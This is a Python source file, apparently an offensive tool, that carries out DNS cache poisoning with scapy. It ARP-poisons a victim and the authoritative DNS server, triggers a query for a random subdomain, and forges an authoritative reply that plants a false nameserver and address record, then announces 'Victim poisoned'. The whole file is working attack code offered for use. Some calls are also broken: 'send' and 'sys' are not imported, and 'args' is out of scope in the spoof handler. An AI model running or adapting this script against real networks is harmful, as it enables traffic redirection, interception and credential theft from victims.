import argparse
from scapy.all import ARP, Ether, sniff, sendp, IP, UDP, DNS, DNSQR, DNSRR
from vars import ccolors
import utils
from arppoison import arppoison

def silent(args):
    # ARP poison the vicitims (two way ARP poisoning)
    arppoison(args.victim, args.soaIP[0])

    # send query request to the victim
    args.randomSubdomain = utils.getRandomSubdomain() + args.targetDomain
    reqPkt = IP(dst=args.victim) / UDP() / DNS(qr=0, qd=DNSQR(qname=args.randomSubdomain))
    send(reqPkt)

    # listen for packets on all interfaces (expect query request from victim to authoritative DNS)
    sniff(prn=dnsSpoof)

def dnsSpoof(pkt):
    if not pkt.haslayer(DNSQR):
        pkt.accept()
    else:
        if args.randomSubdomain in pkt[DNS].qd.qname:
            # return the response to the victim (it will think its from the authoritative DNS)
            spoof_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                        DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                        ns=DNSRR(rrname=args.targetDomain,  type='NS', rdata=args.soaDomain[0], ttl=args.ttl), \
                        ar=DNSRR(rrname=args.soaDomain[0], type='A', rdata=args.addressToForge, ttl=args.ttl))
            sendp(spoof_pkt)
            print ccolors.OK + "Victim poisoned...\n" + ccolors.NC + ccolors.WARNING + "Terminating..." + ccolors.NC
            sys.exit()
        else:
            pkt.accept()
